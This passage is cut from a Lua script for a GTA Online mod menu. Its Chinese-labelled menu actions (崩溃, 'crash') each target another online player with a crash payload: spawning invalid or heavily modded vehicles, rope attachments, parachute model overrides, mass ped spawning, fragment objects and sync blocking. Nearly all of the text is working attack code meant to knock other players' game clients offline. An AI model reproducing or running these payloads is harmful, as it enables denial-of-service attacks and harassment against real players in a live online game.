            util.yield(400)
            menu.trigger_commands("crash8"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("crash9"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("crash10"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("crash11"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("crash12"..players.get_name(pid))
            util.yield(8000)
            menu.trigger_commands("crash"..players.get_name(pid))
            menu.trigger_commands("anticrashcamera off")
        end)

        
        
menu.action(Crash, "5G崩溃", {"crash4"}, "", function()
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        pos.z = pos.z + 10
        veh = entities.get_all_vehicles_as_handles()
        
      for i = 1, #veh do
      NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
      ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
      TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
      TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
      end
  end)
  
menu.action(Crash, "无效载具崩溃", {"crash6"}, "", function()
local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
local vehicles = {}
for i = 1, 4 do
    util.create_thread(function()
        request_model(hashes[i])
        local pcoords = players.get_position(pid)
        local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
        for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
        VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
        for j = 0, 49 do
            local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
            VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
        end
        for j = 0, 20 do
            if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
        end
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
        for ai = 1, 50 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            pcoords = players.get_position(pid)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
            util.yield()
        end
        vehicles[#vehicles+1] = veh
    end)
end
util.yield(2000)
for _, v in pairs(vehicles) do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
    entities.delete_by_handle(v)
end
end)

menu.action(Crash, "Powerfull崩溃", {}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local my_pos = ENTITY.GET_ENTITY_COORDS(user)
    local anim_dict = ("anim@mp_player_intupperstinker")
    anim_request(anim_dict)
    BlockSyncs(pid, function()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        util.yield(100)
        TASK.TASK_SWEEP_AIM_POSITION(user, anim_dict, "toma", "puto", "tonto", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
        util.yield(100)
    end)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, my_pos.x, my_pos.y, my_pos.z, false, false, false)
end)
 menu.action(Crash, "Big CHUNGUS崩溃", {"crash27"}, "来自X-Force (Big CHUNGUS)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        local animation_tonta = ("anim@mp_player_intupperstinker")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos, 0)
            local ped_ = entities.create_ped(1, mdl2, pos, 0)
            local ped3 = entities.create_ped(1, mdl3, pos, 0)
            local ped3 = entities.create_ped(1, mdl4, pos, 0)
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos, 0)
            util.yield(100)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
            
            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, animation_tonta, 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            util.yield(200)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)	

menu.action(Crash, "布尔值崩溃+", {"b1"}, "", function()
    notification("开始崩溃", colors.black)
    for i =1, 55 do 
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
local coords = ENTITY.GET_ENTITY_COORDS(ped)
local model = util.joaat("banshee")
request_model(model)
local vehicle = entities.create_vehicle(model,coords,0)
VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
VEHICLE.SET_VEHICLE_GRAVITY(vehicle, 0)
for i=0, 55 do
   local max_mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)-1
   VEHICLE.SET_VEHICLE_MOD(vehicle, i, max_mod, false)
end
end
util.yield(2400)
menu.trigger_commands("clear1")
notification("崩溃完成", colors.black)
end)
menu.action(Crash,"直升机崩溃",{},"",function()
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
    pos.x = pos.x + 5
    local crashped <const> = CreatePed(30,util.joaat("a_c_rat"),pos,0)
    local crashplane <const> = CreateVehicle(0x9c5e5644,pos,0)
    PED.SET_PED_INTO_VEHICLE(crashped,crashplane,-1)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),crashplane,-1)
    ENTITY.FREEZE_ENTITY_POSITION(crashplane,true)
    local time <const> = util.current_time_millis() + 3500
    TASK.TASK_OPEN_VEHICLE_DOOR(players.user_ped(players.user()), crashplane, 9999, -1, 2)
    while time > util.current_time_millis() do
    TASK.TASK_LEAVE_VEHICLE(crashped, crashplane, 0)
       util.yield(100)
    end
    entities.delete_by_handle(crashped)
    end)
menu.action(Crash, "拖车崩溃+", {"crash99"}, "", function()
    for i = 0, 15 do
    pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    mypos = ENTITY.GET_ENTITY_COORDS(pedp, true)
    tr2 =524108981
    STREAMING.REQUEST_MODEL(tr2)
    local vehicle_ = entities.create_vehicle(tr2, mypos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle_, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
    playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for i = 0, 10 do
    playerpos = ENTITY.GET_ENTITY_COORDS(playerped, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), playerpos.x, playerpos.y, playerpos.z, false, false, false)
    util.yield(15)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mypos.x, mypos.y, mypos.z, false, false, false)
end
util.yield(200)
menu.trigger_commands("clear1")
notification("崩溃完成",colors.black)
end)
menu.action(Crash, "拖车崩溃Plus", {"crash90"}, "", function()
    for i = 0, 20 do
    pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    mypos = ENTITY.GET_ENTITY_COORDS(pedp, true)
    tr2 =524108981
    STREAMING.REQUEST_MODEL(tr2)
    local vehicle1 = entities.create_vehicle(tr2, mypos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
    tr1 =2078290630
    STREAMING.REQUEST_MODEL(tr1)
    local vehicle2 = entities.create_vehicle(tr2, mypos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
    tr3 =1784254509
    STREAMING.REQUEST_MODEL(tr3)
    local vehicle3 = entities.create_vehicle(tr3, mypos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
    playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for i = 0, 15 do
    playerpos = ENTITY.GET_ENTITY_COORDS(playerped, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), playerpos.x, playerpos.y, playerpos.z, false, false, false)
    util.yield(15)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mypos.x, mypos.y, mypos.z, false, false, false)
end
util.yield(2000)
menu.trigger_commands("clear1")
notification("崩溃完成",colors.black)
end)
menu.action(Crash, "无效绳索崩溃", {crash111}, "", function()
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local vehicle = CreateVehicle(0X187D938D, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
    local newRope = PHYSICS.ADD_ROPE(TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, vehicle, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehiclePos.x, vehiclePos.y, vehiclePos.z, 2, false, false, 0, 0, "Center", "Center")
end)
menu.action(Crash, "无效绳索崩溃+", {crash111}, "", function()
    for i = 1, 100 do
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local cargobob = CreateVehicle(0x9c5e5644, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local vehicle = CreateVehicle(0X187D938D, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
    local newRope = PHYSICS.ADD_ROPE(TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, vehicle, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehiclePos.x, vehiclePos.y, vehiclePos.z, 2, false, false, 0, 0, "Center", "Center")
    end
end)
local pclpid = {}
function get_control_request(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
            tick = tick + 1
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
        end
    end
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
        notification("Sin control de "..ent)
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
end
menu.action(Crash, "幻想崩溃", {""}, "By Heezy", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    for i = 1, 23 do
        local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
        pclpid [#pclpid + 1] = pclone 
        PED.CLONE_PED_TO_TARGET(p, pclone)
    end
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
    all_peds = entities.get_all_peds_as_handles()
    local last_ped = 0
    local last_ped_ht = 0
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
            get_control_request(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end
            ENTITY.DETACH_ENTITY(ped, false, false)
            if last_ped ~= 0 then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
            else
                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
            end
            last_ped = ped
        end
    end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(Crash, "耶稣崩溃", {"crash7"}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = players.get_position(pid)
    local mdl = util.joaat("u_m_m_jesus_01")
    local veh_mdl = util.joaat("oppressor")
    util.request_model(veh_mdl)
    util.request_model(mdl)
        for i = 1, 55 do
            if not players.exists(pid) then
                return
            end
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(80)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(50)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end)
menu.action(Crash, "耶稣崩溃V2", {"crash7"}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = players.get_position(pid)
    local mdl = util.joaat("u_m_m_jesus_01")
    local veh_mdl = util.joaat("avenger")
    util.request_model(veh_mdl)
    util.request_model(mdl)
        for i = 1, 100 do
            if not players.exists(pid) then
                return
            end
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(40)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(40)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end)

  menu.toggle_loop(Crash, "懂哥崩溃", {""}, "MMT", function()
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(20)
        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
        TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
        util.yield(400)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(800)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
     end)
     menu.action(Crash, "泡泡糖崩溃", {""}, "", function(PlayerID)
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
        BlockSyncs(PlayerID, function()
        util.yield(250)
        local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
        Jinx.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
        util.yield(50)
        local pos = players.get_position(PlayerID)
        pos.z += 300
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        repeat
            util.yield()
        until PED.GET_PED_PARACHUTE_STATE(user) == 0
        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
        util.yield(50)
        TASK.CLEAR_PED_TASKS(user)
        util.yield(50)
        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
        repeat
            util.yield()
        until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
        pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
        Jinx.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
        pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x, old_pos.y, old_pos.z, false, false)
        end)
    end)


     menu.click_slider(Crash, "大自然崩溃" , {"crash8"}, "",1, 2, 1, 1, function(on_change)
        if on_change == 1 then
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
            util.yield(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
        end
   
    if on_change == 2 then
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
            util.yield(100)
            menu.trigger_commands("invisibility on")
            for i = 0, 110 do
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
                PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
                util.yield(50)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            end
            util.yield(250)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            menu.trigger_commands("invisibility off")
        end
    end)
 




    menu.action(Crash, "马桶崩溃", {"crash9"}, "", function()
        for i = 1, 10 do
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            STREAMING.REQUEST_MODEL(-930879665)
            util.yield(10)
            STREAMING.REQUEST_MODEL(3613262246)
            util.yield(10)
            STREAMING.REQUEST_MODEL(452618762)
            util.yield(10)
            while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
            while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
            while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
            local a1 = entities.create_object(-930879665, cord)
            util.yield(10)
            local a2 = entities.create_object(3613262246, cord)
            util.yield(10)
            local b1 = entities.create_object(452618762, cord)
            util.yield(10)
            local b2 = entities.create_object(3613262246, cord)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
            util.yield(10)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
            util.yield(10)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
            util.yield(10)
        end
        end)
 
        menu.toggle_loop(Crash, "循环碎片崩溃", {""}, "", function()
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                util.yield(350)
                entities.delete_by_handle(object)
            end) 

            menu.action(Crash, "碎片崩溃+", {"crash10"}, "", function()
                BlockSyncs(pid, function()
                    for i = 0, 100 do
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
